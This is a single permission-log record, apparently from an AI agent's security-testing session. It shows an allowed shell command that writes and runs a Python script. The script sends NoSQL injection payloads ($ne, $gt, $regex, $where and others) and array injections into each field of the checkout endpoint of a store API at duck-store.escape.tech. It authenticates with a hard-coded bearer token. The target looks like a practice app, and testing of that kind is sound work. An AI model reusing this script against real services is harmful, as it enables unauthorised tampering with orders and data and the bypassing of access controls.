{"ts": 1790683244.343838, "decision_id": "cbdd599bc27e", "tool": "run_shell", "allow": true, "reason": null, "target": "cat > /work/tool_outputs/nosqli_checkout.py << 'EOF'\nimport requests\nimport json\n\nurl = \"https://duck-store.escape.tech/api/v1/orders/checkout\"\ntoken = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiY2FmYjdmMGItNDU2MS00OTRkLTg3ZGUtM2NiYjk0YjhmNTg1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlckEyIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2ODQ1NTJ9.ltDsw-OTc9wYq4cC_ln8-9kF5nNIazt-X5fsogvXAWM\"\n\nheaders = {\n    \"Authorization\": f\"Bearer {token}\",\n    \"Content-Type\": \"application/json\"\n}\n\n# First add item to cart\ncart_url = \"https://duck-store.escape.tech/api/v1/cart/add\"\ncart_data = {\"product_id\": 1, \"quantity\": 1}\nrequests.post(cart_url, headers=headers, json=cart_data)\n\n# NoSQL injection payloads\nnosqli_payloads = [\n    {\"$ne\": \"\"},\n    {\"$gt\": \"\"},\n    {\"$regex\": \".*\"},\n    {\"$where\": \"1==1\"},\n    {\"$or\": [{\"$ne\": \"\"}]},\n    {\"$nin\": []},\n    {\"$in\": [\"test\"]},\n]\n\n# Test on different parameters\ntest_params = [\"first_name\", \"last_name\", \"address\", \"city\", \"zip_code\", \"country\", \"payment_method\", \"coupon\"]\n\nbase_payload = {\n    \"shipping\": {\"first_name\": \"Test\", \"last_name\": \"User\", \"address\": \"123 Test St\", \"city\": \"Test City\", \"zip_code\": \"12345\", \"country\": \"US\"},\n    \"payment_method\": \"credit_card\",\n    \"coupon\": \"\"\n}\n\nfor param in test_params:\n    for payload in nosqli_payloads:\n        test_data = json.loads(json.dumps(base_payload))\n        \n        if param in test_data[\"shipping\"]:\n            test_data[\"shipping\"][param] = payload\n        else:\n            test_data[param] = payload\n            \n        try:\n            r = requests.post(url, headers=headers, json=test_data, timeout=10)\n            if r.status_code == 200 or r.status_code == 500:\n                print(f\"[+] {param} with {payload}: {r.status_code} - {r.text[:200]}\")\n            else:\n                print(f\"[-] {param} with {payload}: {r.status_code}\")\n        except Exception as e:\n            print(f\"[!] {param} with {payload}: ERROR - {e}\")\n\n# Also test injection via arrays\nprint(\"\\n--- Testing array injection ---\")\nfor param in test_params:\n    test_data = json.loads(json.dumps(base_payload))\n    if param in test_data[\"shipping\"]:\n        test_data[\"shipping\"][param] = [\"test\", {\"$ne\": \"\"}]\n    else:\n        test_data[param] = [\"test\", {\"$ne\": \"\"}]\n    try:\n        r = requests.post(url, headers=headers, json=test_data, timeout=10)\n        if r.status_code == 200 or r.status_code == 500:\n            print(f\"[+] {param} array: {r.status_code} - {r.text[:200]}\")\n        else:\n            print(f\"[-] {param} array: {r.status_code}\")\n    except Exception as e:\n        print(f\"[!] {param} array: ERROR - {e}\")\nEOF\npython3 /work/tool_outputs/nosqli_checkout.py 2>&1 | tee /work/tool_outputs/nosqli_checkout.log"}
